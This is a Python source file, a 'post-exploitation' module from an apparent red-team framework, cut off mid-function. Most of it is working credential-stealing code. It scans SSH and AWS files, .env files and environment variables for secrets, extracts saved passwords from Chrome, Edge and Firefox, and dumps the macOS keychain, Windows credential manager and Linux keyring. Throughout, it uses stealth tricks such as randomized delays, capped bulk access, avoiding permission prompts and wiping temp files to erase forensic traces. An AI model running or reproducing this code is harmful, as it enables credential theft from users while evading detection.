"""
Post-Exploitation Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Post-Exploitation module handles activities after initial access has been gained.
It includes credential harvesting, privilege escalation, lateral movement, data
collection, and exfiltration. This module is critical for maintaining access and
expanding control within the target environment.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.post_exploit import PostExploitation
    
    # Initialize logger and module
    logger = FrameworkLogger("post_exploit_test")
    post_exploit = PostExploitation(logger)
    
    # Harvest credentials from various sources
    creds = post_exploit.harvest_credentials()
    print(f"Credentials found: {creds['count']}")
    
    # Escalate privileges
    escalation = post_exploit.escalate_privileges()
    print(f"Privilege level: {escalation['previous_level']} -> {escalation['new_level']}")
    
    # Move laterally to other systems
    lateral = post_exploit.move_laterally()
    print(f"Lateral movement techniques: {lateral['movement_techniques']}")
    
    # Collect sensitive data
    collection = post_exploit.collect_data()
    print(f"Data collected: {collection['items_collected']} items")
    
    # Exfiltrate collected data
    exfil = post_exploit.exfiltrate_data()
    print(f"Data exfiltrated: {exfil['data_exfiltrated']} items via {exfil['method']}")
    
    # Access collected data
    all_data = post_exploit.get_collected_data()
    all_creds = post_exploit.get_credentials()

Red Team Use Cases:
- Credential harvesting from memory, config files, browsers
- Privilege escalation to gain higher access levels
- Lateral movement across the network
- Sensitive data collection (API keys, tokens, source code)
- Data exfiltration for analysis
- Maintaining persistent access
"""

from typing import Dict, List, Optional
import time
import os
import re
import platform
import subprocess
import socket
import random
from pathlib import Path
from utils.logger import FrameworkLogger
from utils.stealth_file_access import StealthFileAccess
from utils.process_resilience import ProcessResilience, ShellBackend


class PostExploitation:
    """Post-exploitation module"""
    
    def __init__(self, logger: FrameworkLogger, target: Optional[str] = None):
        """
        Initialize post-exploitation module
        
        Args:
            logger: Logger instance
            target: Target system (optional, for remote operations)
        """
        self.logger = logger
        self.target = target
        self.collected_data = []
        self.credentials = []
        self.privilege_level = "user"
        self.resilience = ProcessResilience(logger)
    
    def harvest_credentials(self, target_path: Optional[str] = None) -> Dict:
        """
        Harvest credentials from various sources
        
        Args:
            target_path: Optional path to search for credentials (defaults to current system)
        
        Returns:
            Dictionary containing harvested credentials
        """
        self.logger.info("Harvesting credentials")
        
        # Use resilience wrapper with fallback
        return self.resilience.execute_with_resilience(
            self._harvest_credentials_primary,
            target_path,
            fallback_func=self._harvest_credentials_fallback,
            shell_fallback=ShellBackend.harvest_credentials_shell()
        )
    
    def _harvest_credentials_primary(self, target_path: Optional[str] = None) -> Dict:
        """Primary credential harvesting method"""
        results = {
            "status": "completed",
            "timestamp": time.time(),
            "credentials_found": [],
            "sources": [],
            "count": 0
        }
        
        # Search for credentials in various locations
        search_paths = []
        if target_path:
            search_paths.append(target_path)
        else:
            # Default search locations (Windows-specific paths)
            if platform.system() == "Windows":
                search_paths.extend([
                    os.path.expanduser("~/.aws"),
                    os.path.expanduser("~/AppData/Roaming"),
                    os.path.expanduser("~/AppData/Local"),
                    "C:/ProgramData",
                    "C:/Windows/Temp",
                    "C:/Temp"
                ])
            else:
                # Linux/macOS paths (avoid protected directories)
                search_paths.extend([
                    os.path.expanduser("~/.aws"),
                    os.path.expanduser("~/.ssh"),
                    "/etc",
                    "/var/tmp",
                    "/tmp"
                ])
                
                # Only add ~/.config if not protected
                config_path = os.path.expanduser("~/.config")
                if not StealthFileAccess.is_protected_path(config_path):
                    search_paths.append(config_path)
        
        # Search for credentials (using stealth access)
        for search_path in search_paths:
            # Check if path is accessible without triggering permission prompts
            if StealthFileAccess.can_access(search_path):
                # Skip protected macOS directories
                if StealthFileAccess.is_protected_path(search_path):
                    self.logger.debug(f"Skipping protected path: {search_path}")
                    continue
                
                creds = self._search_for_credentials(search_path)
                if creds:
                    self.credentials.extend(creds)
                    results["sources"].append(search_path)
            else:
                self.logger.debug(f"Cannot access path (permission denied): {search_path}")
        
        # Search environment variables
        env_creds = self._harvest_from_env()
        if env_creds:
            self.credentials.extend(env_creds)
            results["sources"].append("environment_variables")
        
        # Search config files
        config_creds = self._harvest_from_config_files()
        if config_creds:
            self.credentials.extend(config_creds)
            results["sources"].append("config_files")
        
        # Harvest browser passwords
        browser_creds = self._harvest_browser_passwords()
        if browser_creds:
            self.credentials.extend(browser_creds)
            results["sources"].append("browsers")
        
        # Search for passwords in common locations
        password_search_creds = self._search_for_passwords()
        if password_search_creds:
            self.credentials.extend(password_search_creds)
            results["sources"].append("password_search")
        
        # Harvest from credential managers
        cred_manager_creds = self._harvest_from_credential_managers()
        if cred_manager_creds:
            self.credentials.extend(cred_manager_creds)
            results["sources"].append("credential_managers")
        
        results["credentials_found"] = self.credentials
        results["count"] = len(self.credentials)
        
        return results
    
    def _harvest_credentials_fallback(self, target_path: Optional[str] = None) -> Dict:
        """
        Fallback credential harvesting using simpler methods
        
        Args:
            target_path: Optional path to search
            
        Returns:
            Dictionary containing harvested credentials
        """
        self.logger.info("Using fallback credential harvesting method")
        
        results = {
            "status": "completed",
            "timestamp": time.time(),
            "credentials_found": [],
            "sources": [],
            "count": 0,
            "method": "fallback"
        }
        
        # Simplified search paths
        search_paths = []
        
        if target_path:
            search_paths.append(target_path)
        else:
            # Only check easily accessible paths
            home = os.path.expanduser("~")
            search_paths.extend([
                os.path.join(home, ".aws"),
                os.path.join(home, ".ssh"),
                os.path.join(home, ".env"),
                "/tmp"
            ])
        
        # Simple environment variable check
        env_creds = self._harvest_from_env()
        if env_creds:
            self.credentials.extend(env_creds)
            results["sources"].append("environment_variables")
        
        # Check accessible config files only
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            
            try:
                # Use subprocess for file operations to avoid permission issues
                if os.path.isfile(search_path):
                    # Simple grep-like search
                    try:
                        with open(search_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Simple pattern matching
                            patterns = [
                                (r'api[_-]?key["\s:=]+([a-zA-Z0-9_\-]{20,})', "api_key"),
                                (r'password["\s:=]+([^\s"\']{10,})', "password"),
                                (r'secret["\s:=]+([a-zA-Z0-9_\-]{20,})', "secret"),
                            ]
                            
                            for pattern, cred_type in patterns:
                                matches = re.finditer(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    self.credentials.append({
                                        "type": cred_type,
                                        "source": search_path,
                                        "value": match.group(1)[:50] + "..." if len(match.group(1)) > 50 else match.group(1),
                                        "location": search_path
                                    })
                                    if search_path not in results["sources"]:
                                        results["sources"].append(search_path)
                    except (PermissionError, UnicodeDecodeError):
                        continue
            except Exception as e:
                self.logger.debug(f"Error checking {search_path}: {e}")
                continue
        
        results["credentials_found"] = self.credentials
        results["count"] = len(self.credentials)
        
        return results
    
    def _search_for_credentials(self, path: str) -> List[Dict]:
        """Search for credentials in directory using stealth access"""
        credentials = []
        patterns = {
            r'api[_-]?key["\s:=]+([a-zA-Z0-9_\-]{20,})': "api_key",
            r'password["\s:=]+([^\s"\']+)': "password",
            r'secret["\s:=]+([a-zA-Z0-9_\-]{20,})': "secret",
            r'aws[_-]?access[_-]?key["\s:=]+([A-Z0-9]{20})': "aws_access_key",
            r'aws[_-]?secret[_-]?key["\s:=]+([A-Za-z0-9/+=]{40})': "aws_secret_key",
            r'token["\s:=]+([a-zA-Z0-9_\-]{20,})': "token",
            r'bearer["\s:=]+([a-zA-Z0-9_\-\.]{20,})': "bearer_token"
        }
        
        try:
            # Use stealth file access to walk directory
            files = StealthFileAccess.safe_walk_directory(path, max_depth=3)
            
            for file_path in files:
                # Check if file is accessible
                if not StealthFileAccess.can_access(file_path):
                    continue
                
                # Only process relevant file types
                if any(file_path.endswith(ext) for ext in ['.py', '.js', '.json', '.yml', '.yaml', '.env', '.config', '.conf']):
                    # Use stealth read
                    content = StealthFileAccess.safe_read_file(file_path)
                    
                    if content:
                        for pattern, cred_type in patterns.items():
                            matches = re.finditer(pattern, content, re.IGNORECASE)
                            for match in matches:
                                credentials.append({
                                    "type": cred_type,
                                    "source": file_path,
                                    "value": match.group(1)[:50] + "..." if len(match.group(1)) > 50 else match.group(1),
                                    "location": f"{file_path}:{content[:match.start()].count(chr(10))}"
                                })
                        
        except Exception as e:
            self.logger.debug(f"Error searching {path}: {e}")
        
        return credentials
    
    def _harvest_from_env(self) -> List[Dict]:
        """Harvest credentials from environment variables"""
        credentials = []
        env_vars = os.environ
        
        sensitive_patterns = [
            'API_KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'AWS_ACCESS_KEY',
            'AWS_SECRET_KEY', 'BEARER_TOKEN', 'PRIVATE_KEY'
        ]
        
        for var_name, var_value in env_vars.items():
            if any(pattern in var_name.upper() for pattern in sensitive_patterns):
                if len(var_value) > 10:  # Likely a real credential
                    credentials.append({
                        "type": "environment_variable",
                        "source": "environment",
                        "name": var_name,
                        "value": var_value[:50] + "..." if len(var_value) > 50 else var_value
                    })
        
        return credentials
    
    def _harvest_from_config_files(self) -> List[Dict]:
        """Harvest credentials from common config files"""
        credentials = []
        config_files = []
        
        if platform.system() == "Windows":
            config_files.extend([
                os.path.expanduser("~/.aws/credentials"),
                os.path.expanduser("~/.aws/config"),
                os.path.expanduser("~/AppData/Roaming/aws/credentials"),
                "C:/ProgramData/aws/credentials"
            ])
        else:
            config_files.extend([
                os.path.expanduser("~/.aws/credentials"),
                os.path.expanduser("~/.aws/config"),
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.ssh/id_dsa"),
                os.path.expanduser("~/.ssh/config"),
                os.path.expanduser("~/.env"),
                ".env"
            ])
        
        for config_file in config_files:
            # Check access first without triggering permission prompts
            if not StealthFileAccess.can_access(config_file):
                continue
            
            # Skip protected paths
            if StealthFileAccess.is_protected_path(config_file):
                continue
            
            # Use stealth read
            content = StealthFileAccess.safe_read_file(config_file)
            
            if content:
                # Extract AWS credentials
                aws_access_match = re.search(r'aws_access_key_id\s*=\s*([A-Z0-9]{20})', content)
                aws_secret_match = re.search(r'aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})', content)
                
                if aws_access_match:
                    credentials.append({
                        "type": "aws_access_key",
                        "source": config_file,
                        "value": aws_access_match.group(1)
                    })
                if aws_secret_match:
                    credentials.append({
                        "type": "aws_secret_key",
                        "source": config_file,
                        "value": aws_secret_match.group(1)[:50] + "..."
                    })
        
        return credentials
    
    def _harvest_browser_passwords(self) -> List[Dict]:
        """
        Harvest saved passwords from browsers
        
        Supports: Chrome, Firefox, Safari, Edge, Opera, Brave
        
        Uses stealthy techniques:
        - Random delays between browser checks
        - Randomized order of operations
        - Minimal file operations
        - Clean temp file cleanup
        
        Returns:
            List of credential dictionaries
        """
        credentials = []
        home = os.path.expanduser("~")
        
        # Chrome/Chromium (Windows, macOS, Linux)
        chrome_paths = []
        if platform.system() == "Windows":
            chrome_paths = [
                os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Login Data"),
                os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Web Data"),
                os.path.join(os.getenv("APPDATA", ""), "Google", "Chrome", "User Data", "Default", "Login Data"),
            ]
        elif platform.system() == "Darwin":  # macOS
            chrome_paths = [
                os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
                os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Web Data"),
                os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Profile 1", "Login Data"),
            ]
        else:  # Linux
            chrome_paths = [
                os.path.join(home, ".config", "google-chrome", "Default", "Login Data"),
                os.path.join(home, ".config", "google-chrome", "Default", "Web Data"),
                os.path.join(home, ".config", "chromium", "Default", "Login Data"),
            ]
        
        # Firefox (Windows, macOS, Linux)
        firefox_paths = []
        if platform.system() == "Windows":
            firefox_base = os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
            if os.path.exists(firefox_base):
                firefox_paths.append(firefox_base)
        elif platform.system() == "Darwin":  # macOS
            firefox_base = os.path.join(home, "Library", "Application Support", "Firefox", "Profiles")
            if os.path.exists(firefox_base):
                firefox_paths.append(firefox_base)
        else:  # Linux
            firefox_base = os.path.join(home, ".mozilla", "firefox")
            if os.path.exists(firefox_base):
                firefox_paths.append(firefox_base)
        
        # Edge (Windows, macOS)
        edge_paths = []
        if platform.system() == "Windows":
            edge_path = os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Login Data")
            if edge_path:
                edge_paths.append(edge_path)
        elif platform.system() == "Darwin":  # macOS
            edge_path = os.path.join(home, "Library", "Application Support", "Microsoft Edge", "Default", "Login Data")
            if edge_path:
                edge_paths.append(edge_path)
        
        # Safari (macOS only)
        safari_paths = []
        if platform.system() == "Darwin":
            safari_paths = [
                os.path.join(home, "Library", "Safari", "Keychain"),
                os.path.join(home, "Library", "Safari", "Saved Application State"),
            ]
        
        # Randomize order of browser checks for stealth
        browser_operations = []
        
        # Chrome operations
        for chrome_path in chrome_paths:
            if chrome_path and os.path.exists(chrome_path) and StealthFileAccess.can_access(os.path.dirname(chrome_path)):
                browser_operations.append(("chrome", chrome_path))
        
        # Firefox operations
        for firefox_base in firefox_paths:
            if os.path.exists(firefox_base):
                try:
                    if os.path.isdir(firefox_base):
                        for profile_dir in os.listdir(firefox_base):
                            profile_path = os.path.join(firefox_base, profile_dir)
                            if os.path.isdir(profile_path):
                                signons_file = os.path.join(profile_path, "signons.sqlite")
                                logins_file = os.path.join(profile_path, "logins.json")
                                if os.path.exists(signons_file) or os.path.exists(logins_file):
                                    browser_operations.append(("firefox", profile_path))
                except Exception:
                    pass
        
        # Edge operations
        for edge_path in edge_paths:
            if edge_path and os.path.exists(edge_path) and StealthFileAccess.can_access(os.path.dirname(edge_path)):
                browser_operations.append(("edge", edge_path))
        
        # Safari operations
        for safari_path in safari_paths:
            if os.path.exists(safari_path):
                browser_operations.append(("safari", safari_path))
        
        # Randomize order for stealth
        random.shuffle(browser_operations)
        
        # Process browsers with stealthy delays
        for i, (browser_type, browser_path) in enumerate(browser_operations):
            # Stealthy delay between browser checks (mimics natural user behavior)
            if i > 0:
                delay = random.uniform(0.5, 2.0)  # Random delay 0.5-2 seconds
                time.sleep(delay)
            
            try:
                if browser_type == "chrome":
                    creds = self._extract_chrome_passwords(browser_path)
                    credentials.extend(creds)
                elif browser_type == "firefox":
                    creds = self._extract_firefox_passwords(browser_path)
                    credentials.extend(creds)
                elif browser_type == "edge":
                    creds = self._extract_chrome_passwords(browser_path)  # Edge uses same format
                    credentials.extend(creds)
                elif browser_type == "safari":
                    creds = self._extract_safari_passwords(browser_path)
                    credentials.extend(creds)
            except Exception as e:
                self.logger.debug(f"Error extracting {browser_type} passwords: {e}")
        
        return credentials
    
    def _extract_chrome_passwords(self, db_path: str) -> List[Dict]:
        """
        Extract passwords from Chrome/Chromium database
        
        Uses stealthy techniques:
        - Minimal file operations
        - Clean temp file cleanup
        - Avoids leaving traces
        
        Args:
            db_path: Path to Chrome Login Data database
            
        Returns:
            List of credential dictionaries
        """
        credentials = []
        
        # Try to copy database (Chrome locks it when running)
        import shutil
        import tempfile
        
        temp_db_path = None
        try:
            # Use stealth check first
            if not StealthFileAccess.can_access(db_path):
                return credentials
            
            # Create temp file in system temp (less suspicious)
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db', dir=tempfile.gettempdir())
            temp_db_path = temp_db.name
            temp_db.close()
            
            # Copy with stealth timing
            try:
                shutil.copy2(db_path, temp_db_path)
                
                # Small delay to mimic natural file access
                time.sleep(random.uniform(0.1, 0.3))
                
                # Try to read SQLite database
                try:
                    import sqlite3
                    conn = sqlite3.connect(temp_db_path)
                    cursor = conn.cursor()
                    
                    # Chrome stores passwords in logins table
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cursor.fetchall()
                    
                    for origin_url, username, password in rows:
                        if username and password:
                            credentials.append({
                                "type": "browser_password",
                                "source": f"Chrome: {db_path}",
                                "url": origin_url or "",
                                "username": username,
                                "value": password[:50] + "..." if len(password) > 50 else password,
                                "location": db_path
                            })
                    
                    conn.close()
                except sqlite3.Error:
                    # Database might be encrypted or locked
                    pass
                except ImportError:
                    self.logger.debug("sqlite3 not available, skipping Chrome password extraction")
            except Exception as e:
                self.logger.debug(f"Error copying Chrome database: {e}")
        except Exception as e:
            self.logger.debug(f"Error extracting Chrome passwords: {e}")
        finally:
            # Clean up temp file stealthily
            if temp_db_path:
                try:
                    # Overwrite before deletion (reduces forensic traces)
                    if os.path.exists(temp_db_path):
                        with open(temp_db_path, 'wb') as f:
                            f.write(b'\x00' * os.path.getsize(temp_db_path))
                        os.unlink(temp_db_path)
                except Exception:
                    # Best effort cleanup
                    try:
                        os.unlink(temp_db_path)
                    except:
                        pass
        
        return credentials
    
    def _extract_firefox_passwords(self, profile_path: str) -> List[Dict]:
        """
        Extract passwords from Firefox profile
        
        Attempts to decrypt Firefox passwords using:
        - firefox_decrypt tool (if available)
        - Direct decryption using key4.db (requires cryptography library)
        - Fallback: Extract encrypted password strings
        
        Args:
            profile_path: Path to Firefox profile directory
            
        Returns:
            List of credential dictionaries
        """
        credentials = []
        
        # Firefox stores passwords in logins.json (encrypted)
        # Requires key4.db for decryption
        logins_file = os.path.join(profile_path, "logins.json")
        key4_db = os.path.join(profile_path, "key4.db")
        
        if not os.path.exists(logins_file) or not StealthFileAccess.can_access(logins_file):
            return credentials
        
        # Check if key4.db exists (required for decryption)
        has_key4 = os.path.exists(key4_db) and StealthFileAccess.can_access(key4_db)
        
        try:
            content = StealthFileAccess.safe_read_file(logins_file)
            if content:
                import json
                try:
                    data = json.loads(content)
                    if isinstance(data, dict) and "logins" in data:
                        # Try to decrypt passwords if possible
                        decrypted_passwords = {}
                        
                        # Method 1: Try firefox_decrypt Python library (preferred method)
                        if has_key4:
                            try:
                                from firefox_decrypt import decrypt_passwords
                                decrypted_passwords_list = decrypt_passwords(profile_path)
                                for entry in decrypted_passwords_list:
                                    url = entry.get("url", "")
                                    username = entry.get("username", "")
                                    password = entry.get("password", "")
                                    if url and password:
                                        decrypted_passwords[url] = {"username": username, "password": password}
                            except ImportError:
                                # Try command-line tool as fallback
                                try:
                                    import subprocess
                                    result = subprocess.run(
                                        ["python3", "-m", "firefox_decrypt", profile_path],
                                        capture_output=True,
                                        text=True,
                                        timeout=30,
                                        stderr=subprocess.DEVNULL
                                    )
                                    if result.returncode == 0:
                                        # Parse firefox_decrypt output (format: url|username|password)
                                        for line in result.stdout.splitlines():
                                            if "|" in line and not line.startswith("#"):
                                                parts = line.split("|")
                                                if len(parts) >= 3:
                                                    url = parts[0].strip()
                                                    username = parts[1].strip()
                                                    password = parts[2].strip()
                                                    if url and password:
                                                        decrypted_passwords[url] = {"username": username, "password": password}
                                except (FileNotFoundError, subprocess.TimeoutExpired):
                                    pass
                            except Exception as e:
                                self.logger.debug(f"Firefox decryption error: {e}")
                        
                        # Method 2: Try Python-based decryption (if libraries available)
                        if not decrypted_passwords and has_key4:
                            try:
                                # Try to use firefox_decrypt Python library or custom decryption
                                # This requires additional dependencies (firefox_decrypt or cryptography)
                                decrypted_passwords = self._decrypt_firefox_passwords_python(profile_path, data.get("logins", []))
                            except Exception as e:
                                self.logger.debug(f"Python Firefox decryption failed: {e}")
                        
                        # Extract login data
                        for login in data["logins"]:
                            hostname = login.get("hostname", "")
                            
                            # Firefox stores passwords in encryptedUsername and encryptedPassword fields
                            encrypted_username = login.get("encryptedUsername", "")
                            encrypted_password = login.get("encryptedPassword", "")
                            
                            # Try to get decrypted password first
                            username = ""
                            password = ""
                            
                            if hostname in decrypted_passwords:
                                # Use decrypted values if available
                                username = decrypted_passwords[hostname].get("username", "")
                                password = decrypted_passwords[hostname].get("password", "")
                            else:
                                # Fallback to encrypted fields
                                username = encrypted_username if encrypted_username else login.get("username", "")
                                password = encrypted_password if encrypted_password else login.get("password", "")
                            
                            if hostname:
                                # Mark as encrypted if we have encrypted fields but no decryption
                                is_encrypted = bool(encrypted_password or encrypted_username) and not decrypted_passwords
                                
                                credentials.append({
                                    "type": "browser_password",
                                    "source": f"Firefox: {profile_path}",
                                    "url": hostname,
                                    "username": username[:100] + "..." if len(username) > 100 else username,
                                    "value": password[:100] + "..." if len(password) > 100 else password,
                                    "location": logins_file,
                                    "encrypted": is_encrypted,
                                    "encrypted_username": encrypted_username if encrypted_username else None,
                                    "encrypted_password": encrypted_password if encrypted_password else None,
                                    "key4_db_available": has_key4
                                })
                except json.JSONDecodeError:
                    pass
        except Exception as e:
            self.logger.debug(f"Error reading Firefox logins.json: {e}")
        
        return credentials
    
    def _decrypt_firefox_passwords_python(self, profile_path: str, logins: List[Dict]) -> Dict:
        """
        Attempt to decrypt Firefox passwords using Python
        
        This is a placeholder - actual decryption requires:
        - key4.db file access
        - NSS library or firefox_decrypt library
        - Master password (if set)
        
        Args:
            profile_path: Firefox profile path
            logins: List of login dictionaries
            
        Returns:
            Dictionary mapping URLs to decrypted credentials
        """
        decrypted = {}
        
        # Check if we can import decryption libraries
        try:
            # Try firefox_decrypt library (preferred)
            try:
                from firefox_decrypt import decrypt_passwords
                decrypted_passwords_list = decrypt_passwords(profile_path)
                for entry in decrypted_passwords_list:
                    url = entry.get("url", "")
                    username = entry.get("username", "")
                    password = entry.get("password", "")
                    if url:
                        decrypted[url] = {
                            "username": username,
                            "password": password
                        }
                return decrypted
            except ImportError:
                # Try manual decryption using cryptography
                try:
                    import sqlite3
                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                    from cryptography.hazmat.backends import default_backend
                    
                    key4_db = os.path.join(profile_path, "key4.db")
                    if os.path.exists(key4_db):
                        # Attempt to extract key from key4.db
                        # This is complex and requires understanding NSS format
                        # Placeholder for actual implementation
                        pass
                except ImportError:
                    pass
        except Exception as e:
            self.logger.debug(f"Firefox Python decryption error: {e}")
        
        return decrypted
    
    def _extract_safari_passwords(self, safari_path: str) -> List[Dict]:
        """
        Extract passwords from Safari
        
        Args:
            safari_path: Path to Safari directory
            
        Returns:
            List of credential dictionaries
        """
        credentials = []
        
        # Safari stores passwords in macOS Keychain
        # We'll use security command to extract
        try:
            if platform.system() == "Darwin":
                # Use security command to dump Safari passwords
                result = subprocess.run(
                    ["security", "dump-keychain"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    # Parse keychain output for Safari entries
                    for line in result.stdout.splitlines():
                        if "safari" in line.lower() or "keychain" in line.lower():
                            # Extract relevant information
                            if "password" in line.lower() or "pass" in line.lower():
                                credentials.append({
                                    "type": "browser_password",
                                    "source": f"Safari: {safari_path}",
                                    "value": "Found in Keychain",
                                    "location": "macOS Keychain"
                                })
        except Exception as e:
            self.logger.debug(f"Error extracting Safari passwords: {e}")
        
        return credentials
    
    def _search_for_passwords(self) -> List[Dict]:
        """
        Comprehensive password search across file system
        
        Uses stealthy techniques:
        - Random delays between file operations
        - Limited depth traversal
        - Randomized file processing order
        - Stealth file access patterns
        
        Searches for:
        - Password files (*.pass, *.pwd, passwords.txt, etc.)
        - Database files with passwords
        - Configuration files with credentials
        - Documents with password patterns
        
        Returns:
            List of credential dictionaries
        """
        credentials = []
        home = os.path.expanduser("~")
        
        # Common password file patterns
        password_patterns = [
            r'password["\s:=]+([^\s"\']{8,})',
            r'passwd["\s:=]+([^\s"\']{8,})',
            r'pwd["\s:=]+([^\s"\']{8,})',
            r'login["\s:=]+([^\s"\']+)',
            r'username["\s:=]+([^\s"\']+).*password["\s:=]+([^\s"\']{8,})',
        ]
        
        # Common password file names
        password_file_names = [
            "password", "passwords", "passwd", "pwd", "credentials", "creds",
            "login", "logins", "auth", "authentication", "secrets", "secret"
        ]
        
        # Search locations
        search_locations = []
        
        if platform.system() == "Windows":
            search_locations.extend([
                os.path.join(home, "Desktop"),
                os.path.join(home, "Documents"),
                os.path.join(home, "Downloads"),
                os.path.join(home, "OneDrive"),
                os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows") if os.getenv("APPDATA") else None,
                os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft") if os.getenv("LOCALAPPDATA") else None,
            ])
        else:
            search_locations.extend([
                os.path.join(home, "Desktop"),
                os.path.join(home, "Documents"),
                os.path.join(home, "Downloads"),
                os.path.join(home, ".local", "share"),
                os.path.join(home, ".cache"),
            ])
        
        # Filter out None values
        search_locations = [loc for loc in search_locations if loc]
        
        # Randomize order for stealth
        random.shuffle(search_locations)
        
        # Limit number of locations to avoid suspicious patterns
        max_locations = 5
        search_locations = search_locations[:max_locations]
        
        # Search for password files with stealthy delays
        for location_idx, location in enumerate(search_locations):
            # Stealthy delay between locations
            if location_idx > 0:
                delay = random.uniform(1.0, 3.0)  # Random delay 1-3 seconds
                time.sleep(delay)
            
            if not os.path.exists(location) or not StealthFileAccess.can_access(location):
                continue
            
            try:
                # Look for files with password-related names
                files = StealthFileAccess.safe_walk_directory(location, max_depth=2)  # Limited depth
                
                # Randomize file processing order
                random.shuffle(files)
                
                # Limit number of files to process (avoid suspicious bulk operations)
                max_files = 50
                files = files[:max_files]
                
                for file_idx, file_path in enumerate(files):
                    # Small delay between file checks (mimics natural browsing)
                    if file_idx > 0 and file_idx % 10 == 0:
                        time.sleep(random.uniform(0.1, 0.5))
                    
                    file_name = os.path.basename(file_path).lower()
                    
                    # Check if file name suggests passwords
                    if any(name in file_name for name in password_file_names):
                        # Check file extension
                        if any(file_path.endswith(ext) for ext in ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.json', '.db', '.sqlite']):
                            content = StealthFileAccess.safe_read_file(file_path)
                            if content:
                                for pattern in password_patterns:
                                    matches = re.finditer(pattern, content, re.IGNORECASE)
                                    for match in matches:
                                        password_value = match.group(1) if len(match.groups()) == 1 else match.group(2)
                                        if password_value and len(password_value) >= 8:
                                            credentials.append({
                                                "type": "password_file",
                                                "source": file_path,
                                                "value": password_value[:50] + "..." if len(password_value) > 50 else password_value,
                                                "location": file_path
                                            })
                    # Search file content for password patterns
                    elif any(file_path.endswith(ext) for ext in ['.txt', '.md', '.log', '.conf', '.config', '.ini']):
                        content = StealthFileAccess.safe_read_file(file_path)
                        if content and len(content) < 100000:  # Skip very large files
                            for pattern in password_patterns:
                                matches = re.finditer(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    password_value = match.group(1) if len(match.groups()) == 1 else match.group(2)
                                    if password_value and len(password_value) >= 8:
                                        credentials.append({
                                            "type": "password_file",
                                            "source": file_path,
                                            "value": password_value[:50] + "..." if len(password_value) > 50 else password_value,
                                            "location": f"{file_path}:{content[:match.start()].count(chr(10))}"
                                        })
            except Exception as e:
                self.logger.debug(f"Error searching {location} for passwords: {e}")
        
        return credentials
    
    def _harvest_from_credential_managers(self) -> List[Dict]:
        """
        Harvest credentials from OS credential managers
        
        Uses stealthy techniques:
        - Minimal command execution
        - Random delays
        - Limited output parsing
        
        Supports:
        - macOS Keychain
        - Windows Credential Manager
        - Linux Secret Service (GNOME Keyring)
        
        Returns:
            List of credential dictionaries
        """
        credentials = []
        
        if platform.system() == "Darwin":  # macOS
            try:
                # Small delay before credential manager access
                time.sleep(random.uniform(0.5, 1.5))
                
                # Use security command to dump keychain
                result = subprocess.run(
                    ["security", "dump-keychain"],
                    capture_output=True,
                    text=True,
                    timeout=10,
                    stderr=subprocess.DEVNULL  # Suppress errors
                )
                
                if result.returncode == 0:
                    # Parse for common credential patterns
                    keychain_output = result.stdout
                    
                    # Look for internet passwords, generic passwords, etc.
                    if "password" in keychain_output.lower() or "keychain" in keychain_output.lower():
                        # Extract account names and services
                        account_pattern = r'\"acct\"<blob>=\"([^\"]+)\"'
                        service_pattern = r'\"svce\"<blob>=\"([^\"]+)\"'
                        
                        accounts = re.findall(account_pattern, keychain_output)
                        services = re.findall(service_pattern, keychain_output)
                        
                        # Limit number of credentials extracted (avoid bulk operations)
                        max_creds = 20
                        for account, service in zip(accounts[:max_creds], services[:max_creds]):
                            credentials.append({
                                "type": "keychain_credential",
                                "source": "macOS Keychain",
                                "username": account,
                                "service": service,
                                "value": "Found in Keychain",
                                "location": "macOS Keychain"
                            })
            except Exception as e:
                self.logger.debug(f"Error accessing macOS Keychain: {e}")
        
        elif platform.system() == "Windows":
            try:
                # Small delay before credential manager access
                time.sleep(random.uniform(0.5, 1.5))
                
                # Windows Credential Manager stores credentials in registry
                # Try to read from Credential Manager
                result = subprocess.run(
                    ["cmdkey", "/list"],
                    capture_output=True,
                    text=True,
                    timeout=10,
                    stderr=subprocess.DEVNULL  # Suppress errors
                )
                
                if result.returncode == 0:
                    # Parse cmdkey output
                    # Limit number of credentials extracted
                    max_creds = 20
                    cred_count = 0
                    for line in result.stdout.splitlines():
                        if cred_count >= max_creds:
                            break
                        if ":" in line and ("target" in line.lower() or "type" in line.lower()):
                            # Extract credential information
                            credentials.append({
                                "type": "credential_manager",
                                "source": "Windows Credential Manager",
                                "value": line.strip(),
                                "location": "Windows Credential Manager"
                            })
                            cred_count += 1
            except Exception as e:
                self.logger.debug(f"Error accessing Windows Credential Manager: {e}")
        
        else:  # Linux - GNOME Keyring/Secret Service
            try:
                # Small delay before credential manager access
                time.sleep(random.uniform(0.5, 1.5))
                
                # Try to use secret-tool or python-keyring
                result = subprocess.run(
                    ["secret-tool", "search", "--all"],
                    capture_output=True,
                    text=True,
                    timeout=10,
                    stderr=subprocess.DEVNULL  # Suppress errors
                )
                
                if result.returncode == 0:
                    # Parse secret-tool output
                    # Limit number of credentials extracted
                    max_creds = 20
                    cred_count = 0
                    for line in result.stdout.splitlines():
                        if cred_count >= max_creds:
                            break
                        if "=" in line:
                            credentials.append({
                                "type": "keyring_credential",
                                "source": "Linux Keyring",
                                "value": line.strip(),
                                "location": "Linux Keyring"
                            })
                            cred_count += 1
            except Exception as e:
